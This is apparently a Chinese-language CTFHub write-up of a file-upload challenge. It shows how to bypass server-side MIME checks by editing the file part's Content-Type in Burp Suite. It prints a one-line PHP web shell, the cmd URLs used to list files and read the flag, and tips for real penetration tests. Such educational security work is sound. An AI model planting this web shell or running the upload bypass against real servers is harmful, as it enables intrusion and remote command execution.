CTFHub 文件上传 - MIME验证

2026年9月21日 CTFHub Web安全 文件上传 抓包绕过

一、题目信息

  • 题目名称：文件上传 - MIME验证
  • 题目平台：CTFHub 技能树
  • 题目类型：Web安全 / 文件上传漏洞 / 客户端 MIME 类型绕过
  • 靶场链接：http://challenge-ef777ebc906a4b44.sandbox.ctfhub.com:10800（动态环境）
  • 涉及工具：Chrome浏览器、Burp Suite 抓包工具、Base64在线解码工具

二、解题步骤

1. 分析题目考什么

本题的核心考点是基于 MIME 类型验证的绕过。服务器在接收上传文件时，会检查 HTTP 请求体中的 Content-Type 字段（即 MIME 类型），如果它不是图片格式（如 image/jpeg），则拒绝上传。然而，这个 Content-Type 是由客户端（浏览器或抓包工具）发送的。攻击者可以通过拦截 HTTP 请求，将恶意脚本的 MIME 类型伪装成图片的 MIME 类型，从而欺骗服务器，实现绕过。

2. 怎么想（破题思路）

  • 尝试直接上传 shell.php，发现被服务器拦截，提示文件类型错误。这表明服务器在后端检查了文件的格式。
  • 由于 HTTP 协议中，表单提交的每一个字段都包含自己的 Content-Type，而这个字段完全是客户端可控的。
  • 思路：开启 Burp Suite 抓包，拦截上传请求。找到对应文件的 Content-Type，将其修改为 image/jpeg，放行请求。
  • 上传成功后，后续的“找 Flag -> base64 读取”与前面几题完全一致，不要被复杂的绕过步骤干扰，稳住最后两步。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：Burp Suite 误改请求头导致上传失败

踩坑情况：用 Burp 拦截到包后，随手把顶部第 6 行的 Content-Type: multipart/form-data; boundary=... 改成了 image/jpeg，结果放行后服务器报错，上传彻底失败。

原因分析：顶部这个 Content-Type 是用来告诉服务器整个请求体采用的是“多部分表单数据”格式，并且它定义了分隔不同字段的 boundary 字符串。如果把这里改成了图片类型，服务器就无法解析这个请求体了。

改进方式：要精确向下滚动到包含 name="file"; filename="shell.php" 这一行的下方，修改**属于这个文件字段**的 Content-Type。将其从 application/octet-stream 修改为 image/jpeg。

踩坑记录二：cat 读取 PHP 文件导致页面空白

踩坑情况：在寻找 Flag 时，使用 cat 命令读取 flag_xxxx.php，没有报错，但页面一片空白。

原因分析：Flag 文件的内容是 <?php // ctfhub{xxxx} ?>，PHP 解析器会执行这段代码，而 // 后面的内容被当作注释，不会输出到浏览器。

改进方式：使用 base64 命令编码读取文件内容，这样会绕开 PHP 解析器，得到一串 Base64 字符串，再去在线网站解码即可。

详细实操步骤

第一步：准备木马文件

在本地新建 shell.php，写入以下代码：

<?php system($_GET['cmd']); ?>

代码逐字深度解析：

  • <?php：PHP 脚本的起始标记，告诉 Web 服务器从这里开始按 PHP 代码解析。
  • system：PHP 的内置函数，用于执行外部系统命令，并直接输出执行结果。
  • ( )：函数参数括号，里面的内容会作为命令传给 system 执行。
  • $_GET：PHP 超全局变量，用于接收 HTTP GET 请求中 URL 参数的数据。
  • [ 'cmd' ]：数组下标。表示提取 URL 中名为 cmd 的参数值。例如 URL 为 ?cmd=ls，则 $_GET['cmd'] 的值就是 ls。
  • ;：PHP 语句结束符。
  • ?>：PHP 脚本的结束标记。

第二步：利用 Burp Suite 拦截并修改 MIME

1. 打开 Burp Suite，开启 Intercept（拦截）。
2. 在靶机页面选择 shell.php，点击 Submit。
3. 在 Burp 中截获 POST 请求，向下滚动找到请求体：
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream (或 x-php)
4. 将 Content-Type 修改为 Content-Type: image/jpeg。
5. 点击 Forward（放行）。页面提示上传成功，回显路径：upload/shell.php。

第三步：寻找 Flag 文件

在浏览器访问：http://.../upload/shell.php?cmd=ls ../

页面回显发现可疑文件：flag_3143831311.php。

第四步：Base64 读取并解码

访问 .../upload/shell.php?cmd=base64 ../flag_3143831311.php，获得一串 Base64 编码字符串。

在在线 Base64 解码网站解码，得到 Flag：ctfhub{99a45d4092719d5ba19c34f4}。提交即可通关。

4. 怎么迁移（跨领域联想）

  • 真实渗透测试：在实战中，MIME 类型绕过非常常见，通常配合 Content-Length、文件头检测等一起使用。更高级的攻击还包括“图片马”（将 PHP 代码附加在正常图片二进制尾部），绕过内容检测，再配合文件包含漏洞执行。
  • 安全开发（SDL）：后端绝不能信任 HTTP 请求中的 Content-Type 字段。安全的做法是使用“文件头签名检测”（Magic Number），比如读取文件的前几个字节，判断真实格式（如 JPEG 必须以 FF D8 FF 开头），并强制重命名文件。
  • 网络协议分析：这题本质上是对 HTTP 协议 multipart/form-data 数据包结构的分析。深入理解 HTTP 协议的数据包拼接规则，对进行流量分析、爬虫对抗都有极大帮助。

三、名词大全与原理深度复盘

1. MIME 类型（Multipurpose Internet Mail Extensions）

MIME 类型是一种标准，用来表示文档、文件或字节流的性质和格式。常见的如 text/html、image/jpeg、application/x-php。浏览器在发送文件时会根据扩展名猜测其 MIME 类型填入 HTTP 请求头中。

2. HTTP multipart/form-data 协议结构

当表单包含文件上传时，必须使用 multipart/form-data 格式。请求体被分割成多个部分，每个部分由 boundary 分隔。每一个部分都有自己的 Content-Disposition（描述字段名和文件名）和 Content-Type。攻击者能够修改的，正是这个局部字段的 Content-Type。

3. 为什么修改 Content-Type 可以绕过 MIME 验证？

因为 MIME 验证本质上是一种“声明式验证”。服务器只检查用户发来的请求头中是否声明了 `image/jpeg`。这就好比进火车站安检时，你只需要在表格“携带物品”一栏里填上“矿泉水”，而不检查你的包里实际装的是什么，那么你填了“矿泉水”（`image/jpeg`），包里装着“危险品”（PHP 脚本），安检员也会放你进去。

4. 为什么 cat 读 PHP 文件会空白，而 base64 可以？

PHP 解析器在执行文件时，会寻找 <?php 和 ?> 标记。标记之外的 HTML 内容会原样输出，标记之内的 PHP 代码会被执行。Flag 被写在 // 注释中，注释在 PHP 代码中是不参与输出的。而 base64 命令是 Linux 层面的文件读取命令，它不经过 PHP 解析器，直接将文件在磁盘上的原始二进制数据编码输出。因此，base64 可以完美绕过 PHP 解析机制。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与“无限制”的区别：“无限制”不设防；“MIME验证”在服务端增加了对请求头中 Content-Type 的校验。这是从“不设防”到“防得不对”的转变。
  • 与“JS前端验证”的区别：JS 前端验证运行在浏览器中，通过禁用 JS 可以彻底绕过。而 MIME 验证运行在服务端代码中，无法禁用，必须通过抓包修改数据包内容才能绕过。
  • 与“.htaccess”的区别：.htaccess 是攻击服务器配置，让原本合法的图片后缀被当作脚本执行；而 MIME 绕过是“直接伪造身份”，欺骗服务器以为 PHP 文件是图片。两者角度不同，但都体现了“客户端输入不可信”的安全原则。

2. 这种题目的出现原因

这类漏洞在真实开发中很常见。开发人员为了保证安全性，在后端代码写了一句简单的判断：如果 $_FILES['file']['type'] != 'image/jpeg' 就报错。但 $_FILES['file']['type'] 正是来源于 HTTP 请求头，是客户端的声明。开发人员没有意识到这一点，导致了致命的绕过漏洞。

3. 这种应用在实际中如何体现？

在渗透测试实战中，攻击者一旦发现上传被拦截，会习惯性地打开 Burp Suite 抓包。如果发现修改 Content-Type 就能绕过，说明目标网站没有做深层的内容检查（如文件头签名）。高级的渗透测试还会配合 00 截断、二次渲染、竞争条件等漏洞，进一步获取服务器权限。

4. 如何抽象理解概念（大白话理解）

把网站服务器比作公司的前台：

  • 正常上传：你要送一份文件给公司。前台要求只能送“图片”。
  • 服务端 MIME 验证：前台打开你的信封，看到你在表格里填写的“物品类型”是“危险文件（application/x-php）”，于是拒绝接收。
  • 攻击者抓包修改：你出门后，用涂改液把信封上表格里的“物品类型”改成了“图片（image/jpeg）”，然后再次递给前台。
  • 绕过成功：前台只看表格，不打开信封看里面到底装的是什么（文件内容）。看到写着“图片”，就收下了。最终你把危险文件成功送进了公司。
